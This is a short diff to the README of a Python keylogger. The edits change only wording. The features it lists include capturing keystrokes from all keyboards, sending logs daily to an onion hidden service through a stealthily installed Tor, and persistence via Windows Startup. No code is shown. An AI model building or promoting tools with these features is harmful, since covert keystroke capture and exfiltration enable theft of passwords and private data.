@@ -13,12 +13,12 @@ Some uses of a keylogger are:
 - Global event hook on all (incl. On-Screen) keyboards using cross-platform library [Keyboard](https://github.com/boppreh/keyboard). The program makes no attempt to hide itself.
 - Pure Python, no C modules to be compiled.
 - 2 logging modes:
-  - Storing logs locally and once a day sending logs to your onion hidden service (via Tor, of course, stealthily installing it);
+  - Storing logs locally and once a day sending logs to your onion hidden service (via Tor, stealthily installing it);
   - Debug mode (printing to console).
 - Persistence:
   - Adding to Windows Startup.
 - Human-readable logs:
-  - Logging keys as they actually are in your layout; cyrillic keyboard layout is fully implemented;
+  - Logging keys as they actually are in your layout;
   - Logging window titles and current time where appropriate;
   - Backspace support (until the active window is changed);
   - Full upper-/ lowercase detection (capslock + shift keys).
